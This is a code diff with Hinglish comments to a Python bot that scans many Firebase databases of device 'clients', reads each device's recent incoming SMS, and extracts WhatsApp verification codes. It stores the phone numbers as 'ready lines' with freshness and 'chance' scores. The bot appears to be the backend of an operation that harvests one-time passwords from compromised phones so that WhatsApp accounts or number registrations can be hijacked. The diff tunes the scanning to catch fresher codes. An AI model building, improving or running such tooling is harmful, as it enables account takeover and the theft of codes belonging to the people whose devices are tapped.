@@ -47,7 +47,6 @@ async def check_device(bot, fb_url, auth, dev_id, users, last_msg_id, phone_numb
             if otp:
                 detected_service = fbu.extract_service_name(text, sender)
                 
-                # 🚨 STRICT FILTER: Agar user ne WhatsApp select kiya hai, to sirf WhatsApp ka OTP jaye
                 if service_filter == "whatsapp":
                     if "whatsapp" not in text.lower() and "whatsapp" not in sender.lower() and not re.search(r'code:\s*\d{3}-\d{3}', text):
                         continue
@@ -111,6 +110,7 @@ async def whatsapp_scanner(bot):
             ready_lines = {}
             now = time.time()
             
+            # Sabhi firebases ko scan karo
             for i in range(0, len(fbs), 5):
                 chunk = fbs[i:i+5]
                 for fb in chunk:
@@ -119,35 +119,39 @@ async def whatsapp_scanner(bot):
                     
                     for dev_id, c in clients.items():
                         if not isinstance(c, dict): continue
-                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 1800) * 1000)
+                        is_online = c.get("status") is True or (c.get("ping", {}).get("ts", 0) > (now - 3600) * 1000) # 1 hour tak online
                         
                         if is_online:
-                            msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=10", fb.get("auth"))
+                            # Last 20 messages check karo
+                            msgs_dict = await fbu.fetch_fb(f"{fb['url']}/messages/{dev_id}.json?orderBy=%22%24key%22&limitToLast=20", fb.get("auth"))
                             if not msgs_dict: continue
                             
                             msgs = [v for v in msgs_dict.values() if isinstance(v, dict) and v.get("type") == "incoming"]
                             
-                            has_recent_ws = False
+                            has_ws = False
                             latest_id = 0
                             for m in msgs:
                                 txt = (m.get("message") or "").lower()
                                 snd = (m.get("sender") or "").lower()
                                 if "whatsapp" in txt or "whatsapp code:" in txt or re.search(r'code:\s*\d{3}-\d{3}', txt):
-                                    has_recent_ws = True
+                                    has_ws = True
                                     mid = int(m.get("id", 0))
                                     if mid > latest_id: latest_id = mid
                             
-                            if has_recent_ws:
+                            if has_ws:
                                 best_nums = fbu.extract_best_numbers(c, msgs)
                                 if best_nums:
                                     num = best_nums[0][0]
                                     health = fbu.calculate_health(msgs)
+                                    ws_chance = fbu.get_ws_chance(msgs) 
                                     
-                                    ready_lines[dev_id] = {
-                                        "fb_url": fb['url'], "auth": fb.get("auth", ""),
-                                        "number": num, "chance": 99, "health": health,
-                                        "time": int(now), "sort_id": latest_id
-                                    }
+                                    # Agar chance 90% se zyada hai (fresh hai)
+                                    if ws_chance >= 90:
+                                        ready_lines[dev_id] = {
+                                            "fb_url": fb['url'], "auth": fb.get("auth", ""),
+                                            "number": num, "chance": ws_chance, "health": health,
+                                            "time": int(now), "sort_id": latest_id
+                                        }
             
             d = db.load_data()
             d["whatsapp_ready_lines"] = ready_lines
